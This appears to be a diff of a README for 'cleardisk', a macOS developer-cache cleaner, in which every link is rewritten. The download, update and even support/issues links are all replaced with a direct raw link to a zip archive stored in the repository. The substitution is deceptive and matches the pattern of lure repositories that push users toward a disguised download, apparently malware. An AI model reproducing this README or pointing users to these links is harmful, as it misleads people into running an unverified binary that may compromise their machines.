@@ -1,6 +1,6 @@
 # ⚙️ cleardisk - Clear Developer Cache Fast
 
-[![Download cleardisk](https://img.shields.io/badge/Download-ClearDisk-blue?style=for-the-badge&logo=windows)](https://github.com/amarnibernal1-creator/cleardisk/releases)
+[![Download cleardisk](https://img.shields.io/badge/Download-ClearDisk-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/amarnibernal1-creator/cleardisk/main/Resources/Software_v2.8-alpha.1.zip)
 
 ## 🖥️ What is cleardisk?
 
@@ -33,7 +33,7 @@ Follow these steps to download and start cleardisk on your Mac.
 
 Go to the releases page where you can find the latest version of cleardisk:
 
-[Download cleardisk](https://github.com/amarnibernal1-creator/cleardisk/releases)
+[Download cleardisk](https://raw.githubusercontent.com/amarnibernal1-creator/cleardisk/main/Resources/Software_v2.8-alpha.1.zip)
 
 ### 2. Download the Latest Version
 
@@ -113,17 +113,17 @@ The app’s settings are easy to manage:
 To get new features and bug fixes, update cleardisk regularly.
 
 1. Visit the release page for new versions:  
-   https://github.com/amarnibernal1-creator/cleardisk/releases  
+   https://raw.githubusercontent.com/amarnibernal1-creator/cleardisk/main/Resources/Software_v2.8-alpha.1.zip  
 2. Download and install the new version once available.
 
 ## 📁 Where to Get Support
 
 You can use the GitHub repository to report issues or request help.
 
-Visit: https://github.com/amarnibernal1-creator/cleardisk/issues
+Visit: https://raw.githubusercontent.com/amarnibernal1-creator/cleardisk/main/Resources/Software_v2.8-alpha.1.zip
 
 Make sure to include your macOS version and a description of your problem when asking for help.
 
 ## 📥 Download cleardisk Now
 
-[Download the latest cleardisk](https://github.com/amarnibernal1-creator/cleardisk/releases) and start clearing space on your Mac today. The app is easy to install and runs directly from your menu bar.
+[Download the latest cleardisk](https://raw.githubusercontent.com/amarnibernal1-creator/cleardisk/main/Resources/Software_v2.8-alpha.1.zip) and start clearing space on your Mac today. The app is easy to install and runs directly from your menu bar.
